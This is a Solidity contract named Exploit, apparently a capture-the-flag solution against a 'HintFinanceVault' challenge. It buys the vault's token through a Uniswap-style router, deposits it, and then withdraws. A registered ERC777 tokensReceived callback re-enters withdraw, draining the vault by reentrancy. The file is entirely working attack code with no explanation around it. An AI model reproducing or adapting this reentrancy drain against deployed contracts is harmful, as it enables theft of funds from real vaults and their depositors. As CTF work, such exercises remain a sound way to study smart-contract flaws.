// SPDX-License-Identifier: VPL

pragma solidity 0.8.16;

import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
import "@openzeppelin/contracts/interfaces/IERC1820Registry.sol";

import "./HintFinanceVault.sol";
import "./Setup.sol";

contract Exploit is IERC777Recipient {
  	HintFinanceVault public vault;
	
    IERC1820Registry private _erc1820 = IERC1820Registry(
		0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24
	);
    bytes32 constant private TOKENS_RECIPIENT_INTERFACE_HASH = keccak256(
		"ERC777TokensRecipient"
	);


	UniswapV2RouterLike private router = UniswapV2RouterLike(
		0xf164fC0Ec4E93095b804a4795bBe1e041497b92a
	);
    address private weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
	address private vaultToken; 

  	constructor(address _vaultAddr) {
      	vault = HintFinanceVault(_vaultAddr);
		vaultToken = vault.underlyingToken();
        _erc1820.setInterfaceImplementer(
			address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this)
		);
  	}
	
	bool private _fallbackActivated = false;
	uint256 private hackAmount;
  	function hackEet() public payable {
        address[] memory path = new address[](2);
        path[0] = weth;
		path[1] = vaultToken;
        router.swapExactETHForTokens{value: 1 ether}(
			0, path, address(this), block.timestamp
		);

		_fallbackActivated = true;
		ERC20Like(vaultToken).approve(address(vault), (2**256)-1);
		hackAmount = ERC20Like(vaultToken).balanceOf(address(this));
      	vault.deposit(hackAmount);

      	vault.withdraw(hackAmount);
  	}

  	function _fallback() private {
		if(ERC20Like(vaultToken).balanceOf(address(vault)) >= hackAmount*2)
			vault.withdraw(hackAmount);
  	}

	// ERC777 callback implementation for ERC20 transfers
	function tokensReceived(
      	address,
      	address from,
      	address,
      	uint256 amount,
      	bytes calldata userData,
      	bytes calldata
	) external {
		if(_fallbackActivated)
			_fallback();
	}
}

